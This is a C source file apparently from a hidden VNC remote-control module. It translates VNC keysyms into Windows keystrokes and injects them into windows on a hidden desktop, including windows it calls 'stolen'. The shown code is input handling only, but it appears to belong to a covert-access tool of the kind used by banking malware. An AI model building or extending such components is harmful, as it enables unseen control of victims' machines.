#include "..\includes.h"
#include "kbd.h"
#include "kbd_data.h"
#include "taskswitcher.h"
#include "windows.h"
#include "events.h"
#include "wnd_steal.h"
#include <rfb\keysym.h>

HKL hklLocales[40];
int dwLocalesNum;

WORD UpdateInputState(PHVNC lpServer,byte bVK,rfbBool bDown)
{
    if (bVK)
    {
        lpServer->lpGlobalVNCData->KbdState[bVK]=(bDown) ? 0x80:0;
        switch (bVK)
        {
            case VK_LSHIFT:
            case VK_RSHIFT:
            {
                lpServer->lpGlobalVNCData->KbdState[VK_SHIFT]=((lpServer->lpGlobalVNCData->KbdState[VK_LSHIFT] & 0x80) || (lpServer->lpGlobalVNCData->KbdState[VK_RSHIFT] & 0x80)) ? 0x80:0;
                break;
            }

            case VK_LCONTROL:
            case VK_RCONTROL:
            {
                lpServer->lpGlobalVNCData->KbdState[VK_CONTROL]=((lpServer->lpGlobalVNCData->KbdState[VK_LCONTROL] & 0x80) || (lpServer->lpGlobalVNCData->KbdState[VK_RCONTROL] & 0x80)) ? 0x80:0;
                break;
            }

            case VK_LMENU:
            case VK_RMENU:
            {
                lpServer->lpGlobalVNCData->KbdState[VK_MENU]=((lpServer->lpGlobalVNCData->KbdState[VK_LMENU] & 0x80) || (lpServer->lpGlobalVNCData->KbdState[VK_RMENU] & 0x80)) ? 0x80:0;
                break;
            }
        }
    }

    WORD wMouseState=0;
    if (lpServer->lpGlobalVNCData->KbdState[VK_LBUTTON] & 0x80)
        wMouseState|=MK_LBUTTON;
    if (lpServer->lpGlobalVNCData->KbdState[VK_RBUTTON] & 0x80)
        wMouseState|=MK_RBUTTON;
    if (lpServer->lpGlobalVNCData->KbdState[VK_MBUTTON] & 0x80)
        wMouseState|=MK_MBUTTON;
    if (lpServer->lpGlobalVNCData->KbdState[VK_SHIFT] & 0x80)
        wMouseState|=MK_SHIFT;
    if (lpServer->lpGlobalVNCData->KbdState[VK_CONTROL] & 0x80)
        wMouseState|=MK_CONTROL;

    return wMouseState;
}

#ifndef _INJLIB
WCHAR KS2Unicode(DWORD dwKeySym)
{
    if (dwKeySym == 0xf3)
        dwKeySym=XK_Cyrillic_u;
    else if (dwKeySym == 0xd3)
        dwKeySym=XK_Cyrillic_U;

    if (((dwKeySym >= 0x0020) && (dwKeySym <= 0x007e)) || ((dwKeySym >= 0x00a0) && (dwKeySym <= 0x00ff)) || ((dwKeySym & 0xff000000) == 0x01000000))
        return (WCHAR)dwKeySym;

    int minVal=0,maxVal=countof(keySymToUnicodeTable),midVal;

    while (maxVal >= minVal)
    {
        midVal=(minVal+maxVal)/2;
        WORD wKey=keySymToUnicodeTable[midVal].keySym;
        if (wKey < dwKeySym)
            minVal=midVal+1;
        else if (wKey > dwKeySym)
            maxVal=midVal-1;
        else
            return keySymToUnicodeTable[midVal].unicode;
    }

    return 0;
}

bool IsItAltTabOnly(PHVNC lpServer,byte bVK)
{
    bool bRet=true;
    if ((!(lpServer->lpGlobalVNCData->KbdState[VK_MENU] & 0x80)) || (!(lpServer->lpGlobalVNCData->KbdState[VK_TAB] & 0x80)) || (!bVK))
    {
        if (lpServer->TaskSwitcherInfo.bTaskSwitcherIsShown)
        {
            DestroyTaskSwitcherWnd(lpServer,bVK != 0);
            lpServer->KbdStateInfo.bSkipEvent=true;
        }
        lpServer->KbdStateInfo.bTabPressed=false;
        bRet=false;
    }
    else
    {
        lpServer->KbdStateInfo.bTabPressed=((lpServer->lpGlobalVNCData->KbdState[VK_TAB] & 0x80) != 0);

        bool brMenu=false,blMenu=false;
        for (int i=0; i < sizeof(lpServer->lpGlobalVNCData->KbdState); i++)
        {
            if (lpServer->lpGlobalVNCData->KbdState[i] & 0x80)
            {
                if (i == VK_RMENU)
                {
                    if (blMenu)
                    {
                        bRet=false;
                        break;
                    }
                    brMenu=true;
                }
                else if (i == VK_LMENU)
                {
                    if (brMenu)
                    {
                        bRet=false;
                        break;
                    }
                    blMenu=true;
                }

                if ((i != VK_MENU) && (i != VK_RMENU) && (i != VK_LMENU) && (i != VK_TAB))
                {
                    if (lpServer->TaskSwitcherInfo.bTaskSwitcherIsShown)
                        DestroyTaskSwitcherWnd(lpServer,false);
                    lpServer->KbdStateInfo.bTabPressed=false;
                    bRet=false;
                    break;
                }
            }
        }
    }
    return bRet;
}

bool IsItAltShiftOnly(PHVNC lpServer,byte bVK)
{
    if ((!(lpServer->lpGlobalVNCData->KbdState[VK_MENU] & 0x80)) || (!(lpServer->lpGlobalVNCData->KbdState[VK_SHIFT] & 0x80)) || (!bVK))
        return false;

    lpServer->KbdStateInfo.bShiftPressed=((lpServer->lpGlobalVNCData->KbdState[VK_SHIFT] & 0x80) != 0);
    bool bRet=true,brMenu=false,blMenu=false,brShift=false,blShift=false;
    for (int i=0; i < sizeof(lpServer->lpGlobalVNCData->KbdState); i++)
    {
        if (lpServer->lpGlobalVNCData->KbdState[i] & 0x80)
        {
            if (i == VK_RMENU)
            {
                if (blMenu)
                {
                    bRet=false;
                    break;
                }
                brMenu=true;
            }
            else if (i == VK_LMENU)
            {
                if (brMenu)
                {
                    bRet=false;
                    break;
                }
                blMenu=true;
            }
            else if (i == VK_RSHIFT)
            {
                if (blShift)
                {
                    bRet=false;
                    break;
                }
                brShift=true;
            }
            else if (i == VK_LSHIFT)
            {
                if (brShift)
                {
                    bRet=false;
                    break;
                }
                blShift=true;
            }

            if ((i != VK_MENU) && (i != VK_RMENU) && (i != VK_LMENU) && (i != VK_SHIFT) && (i != VK_RSHIFT) && (i != VK_LSHIFT))
            {
                bRet=false;
                break;
            }
        }
    }
    return bRet;
}

bool CheckLayout(WORD wVk,WCHAR wcOrig,HKL hLayout)
{
    WCHAR wcTmp;
    bool bRet=false;
    BYTE KbdState[256]={0},bFlags=HIBYTE(wVk),bVk=LOBYTE(wVk);

    if (bFlags & 1)
        KbdState[VK_RSHIFT]=KbdState[VK_SHIFT]=0x80;

    if (bFlags & 2)
        KbdState[VK_RCONTROL]=KbdState[VK_CONTROL]=0x80;

    if (bFlags & 4)
        KbdState[VK_RMENU]=KbdState[VK_MENU]=0x80;

    KbdState[bVk]=0x80;

    ToUnicodeEx(bVk,MapVirtualKeyEx(bVk,MAPVK_VK_TO_VSC,hLayout),KbdState,&wcTmp,1,0,hLayout);
    if (wcOrig == wcTmp)
        bRet=true;
    return bRet;
}

HKL GetLocaleByChar(WCHAR wcChar,WORD *lpVK)
{
    HKL hLocale=0;
    bool bFound=false;

    for (int i=0; i < dwLocalesNum; i++)
    {
        SHORT wVk=VkKeyScanExW(wcChar,hklLocales[i]);
        if (wVk != -1)
        {
            for (int j=0; j < dwLocalesNum; j++)
            {
                if (CheckLayout(wVk,wcChar,hklLocales[j]))
                {
                    bFound=true;
                    if (lpVK)
                        *lpVK=wVk;
                    hLocale=hklLocales[j];
                    break;
                }
            }
            if (bFound)
                break;
        }
    }
    return hLocale;
}

WCHAR PrepareVKChar(WCHAR cChar)
{
    HKL hKL=GetLocaleByChar(cChar,NULL);
    return LOBYTE(VkKeyScanEx(cChar,hKL));
}

bool CheckTranslateMessage(PHVNC lpServer,HWND hWnd)
{
    return (SendMessage(hWnd,lpServer->lpGlobalVNCData->dwVNCMessage,VMW_ISTRANSMSGUSED,NULL) != (LRESULT)hWnd);
}

DWORD dwIgnoreKeys[]={XK_Num_Lock,XK_Caps_Lock,XK_Scroll_Lock};

void ExecuteKeySym(rfbClientPtr cl,HWND hWnd,DWORD dwKeySym,rfbBool bDown)
{
    PHVNC lpServer=(PHVNC)cl->screen->screenData;
    DWORD lParam=bDown ? 0:((1<<31)|(1<<30));
    byte dwVK=0;
    UINT uMsg;
    WPARAM wParam;

    if ((dwKeySym >= XK_dead_grave) && (dwKeySym <= XK_dead_belowdot))
        return;

    for (byte i=0; i < countof(dwIgnoreKeys); i++)
    {
        if (dwIgnoreKeys[i] == dwKeySym)
            return;
    }

    for (byte i=0; i < countof(keySymToVirtualKeyTable); i++)
    {
        if (keySymToVirtualKeyTable[i].keySym == dwKeySym)
        {
            dwVK=keySymToVirtualKeyTable[i].virtualKey;
            if (keySymToVirtualKeyTable[i].extended)
                lParam|=(1<<24);
            break;
        }
    }

    g_enter(hInputMutex)
    {
        if ((!dwVK) && (CheckTranslateMessage(lpServer,hWnd)))
            dwVK=PrepareVKChar(KS2Unicode(dwKeySym));
        if (dwVK)
        {
            UpdateInputState(lpServer,dwVK,bDown);
            byte bScanCode=MapVirtualKey(dwVK,MAPVK_VK_TO_VSC) & 0xFF;
            if (bScanCode)
                lParam|=(bScanCode<<16);

            bool bIsSysKey=((lpServer->lpGlobalVNCData->KbdState[VK_MENU] & 0x80) && (!(lpServer->lpGlobalVNCData->KbdState[VK_CONTROL] & 0x80)));
            if (bDown)
            {
                lpServer->KbdStateInfo.bVKDown=true;
                uMsg=(bIsSysKey) ? WM_SYSKEYDOWN:WM_KEYDOWN;
            }
            else
            {
                lpServer->KbdStateInfo.bVKDown=false;
                uMsg=(bIsSysKey) ? WM_SYSKEYUP:WM_KEYUP;
            }
            wParam=dwVK;
        }
        else
        {
            if (((!lpServer->KbdStateInfo.bVKDown) && (!lpServer->KbdStateInfo.bKeyDown)) || ((lpServer->KbdStateInfo.bVKDown) && (lpServer->lpGlobalVNCData->KbdState[VK_SHIFT] & 0x80) && (!lpServer->lpGlobalVNCData->KbdState[VK_MENU]) && (!lpServer->lpGlobalVNCData->KbdState[VK_CONTROL])))
            {
                WCHAR wcChar;
                if ((!bDown) || (!(wcChar=KS2Unicode(dwKeySym))))
                {
                    g_leave(hInputMutex)
                    return;
                }

                if (lpServer->lpGlobalVNCData->KbdState[VK_MENU] & 0x80)
                    lParam|=(1<<29);
                wParam=wcChar;
                uMsg=WM_CHAR;

                if (lpServer->lpGlobalVNCData->bAutodectLayout)
                {
                    HKL hCurLay=GetKeyboardLayout(GetWindowThreadProcessId(hWnd,0));
                    WORD wVk;
                    if (((wVk=VkKeyScanExW(wcChar,hCurLay)) == -1) || (!CheckLayout(wVk,wcChar,hCurLay)))
                    {
                        HKL hLocale=GetLocaleByChar(wcChar,NULL);
                        if (hLocale)
                            SendMessage(hWnd,lpServer->lpGlobalVNCData->dwVNCMessage,VMW_CHANGELAYOUT,(LPARAM)hLocale);
                    }
                }
            }
            else
            {
                wParam=0;
                GetLocaleByChar(KS2Unicode(dwKeySym),(WORD*)&wParam);
                if (bDown)
                {
                    lpServer->KbdStateInfo.bKeyDown=true;
                    uMsg=WM_KEYDOWN;
                }
                else
                {
                    lpServer->KbdStateInfo.bKeyDown=false;
                    uMsg=WM_KEYUP;
                }
            }
        }
    }
    g_leave(hInputMutex)

    if (IsItAltTabOnly(lpServer,dwVK))
    {
        if (lpServer->KbdStateInfo.bTabPressed)
        {
            if (!lpServer->TaskSwitcherInfo.bTaskSwitcherIsShown)
            {
                ShowTaskSwitcherWnd(lpServer);
                lpServer->TaskSwitcherInfo.bTaskSwitcherIsShown=true;
            }
            else
                NextTask(lpServer);
        }
    }
    else
    {
        if (!lpServer->KbdStateInfo.bSkipEvent)
        {
            do
            {
                if (IsItAltShiftOnly(lpServer,dwVK))
                {
                    HVNC_SHORT_CLIENT_INFO *lpClient=(HVNC_SHORT_CLIENT_INFO *)cl->clientData;
                    DWORD dwLastShiftInputTime=GetTickCount();
                    if ((lpClient) && (dwLastShiftInputTime-lpClient->dwLastShiftInputTime < 500))
                        break;
                    lpClient->dwLastShiftInputTime=dwLastShiftInputTime;
                    if (lpServer->KbdStateInfo.bShiftPressed)
                        SendMessage(hWnd,lpServer->lpGlobalVNCData->dwVNCMessage,VMW_CHANGELAYOUT,(LPARAM)HKL_NEXT);
                }
                SendMessage(hWnd,lpServer->lpGlobalVNCData->dwVNCMessage,VMW_UPDATE_KEYSTATE,0);
                PostMessage(hWnd,uMsg,wParam,lParam);
            }
            while (false);
        }
        lpServer->KbdStateInfo.bSkipEvent=false;
    }
    return;
}

inline void DoKeyEvent(byte bVk,DWORD dwFlags)
{
    keybd_event(bVk,MapVirtualKey(bVk,MAPVK_VK_TO_VSC),dwFlags,0);
    return;
}

void KeyRelease(byte bVK)
{
    if (GetAsyncKeyState(bVK) & 0x8000)
        DoKeyEvent(bVK,KEYEVENTF_KEYUP);
    return;
}

void KeyPress(byte bVK)
{
    if (!(GetAsyncKeyState(bVK) & 0x8000))
        DoKeyEvent(bVK,0);
    return;
}

void DoKeyEventWithModifiers(byte bVk,byte bState,bool bDown)
{
    if (bDown)
    {
        bool bCapsOn=((GetKeyState(VK_CAPITAL) & 1) != 0);
        if (bCapsOn)
            bState^=1;

        if (bState & 1)
            KeyPress(VK_LSHIFT);
        else
            KeyRelease(VK_LSHIFT);
        if (bState & 2)
            KeyPress(VK_LCONTROL);
        if (bState & 4)
            KeyPress(VK_LMENU);
    }

    DoKeyEvent(bVk,bDown ? 0:KEYEVENTF_KEYUP);

    if (bDown)
    {
        if (bState & 1)
            KeyRelease(VK_LSHIFT);
        if (bState & 2)
            KeyRelease(VK_LCONTROL);
        if (bState & 4)
            KeyRelease(VK_LMENU);
    }
    return;
}

void ProcessInputDesktopKbdMsg(DWORD dwKeySym,rfbBool bDown)
{
    byte bVK=0;
    DWORD dwFlags=0;
    for (byte i=0; i < countof(keySymToVirtualKeyTable); i++)
    {
        if (keySymToVirtualKeyTable[i].keySym == dwKeySym)
        {
            bVK=keySymToVirtualKeyTable[i].virtualKey;
            if (keySymToVirtualKeyTable[i].extended)
                dwFlags|=KEYEVENTF_EXTENDEDKEY;
            break;
        }
    }

    if (bVK)
    {
        if (!bDown)
            dwFlags|=KEYEVENTF_KEYUP;
        DoKeyEvent(bVK,dwFlags);
    }
    else
    {
        if (!bDown)
            dwFlags|=KEYEVENTF_KEYUP;

        HKL hKL=(HKL)LOWORD(GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(),NULL)));
        SHORT wScanCode=VkKeyScanEx(KS2Unicode(dwKeySym),hKL);
        DoKeyEventWithModifiers(LOBYTE(wScanCode),HIBYTE(wScanCode),bDown);
    }
    return;
}

void ProcessKbdMsg(rfbClientPtr cl,DWORD dwKeySym,rfbBool bDown)
{
    PHVNC lpServer=(PHVNC)cl->screen->screenData;
    if (dwKeySym)
    {
        if (lpServer->DeskInfo.bInputDesktop)
            ProcessInputDesktopKbdMsg(dwKeySym,bDown);
        else
        {
            HWND hWnd=lpServer->lpGlobalVNCData->hForegroundWnd;

            HDESK hPrevDesk=NULL;
            if (IsStolenWindow(lpServer,hWnd))
                hPrevDesk=SwitchThreadToStolenWindowDesktop(hWnd);

            if ((!hWnd) || (!IsWindowEx(lpServer,hWnd)) || (!IsWindowVisibleEx(lpServer,hWnd)) || (IsIconic(hWnd)))
                hWnd=GetLastActivePopup(lpServer->WndsInfo.hDeskWnd);
            else
            {
                HWND hPopupWnd=GetTopPopupWindow(lpServer,hWnd);
                if (hPopupWnd)
                {
                    hWnd=hPopupWnd;
                    SetForegroundWnd(lpServer,hWnd); ///продумать для краденых окон
                }
                HWND hFocusWnd=GetWindowFocus(hWnd);
                if (hFocusWnd)
                    hWnd=hFocusWnd;
            }
            ExecuteKeySym(cl,hWnd,dwKeySym,bDown);

            if (hPrevDesk)
                SetThreadDesktopEx(hPrevDesk);
        }
    }
    return;
}
#endif
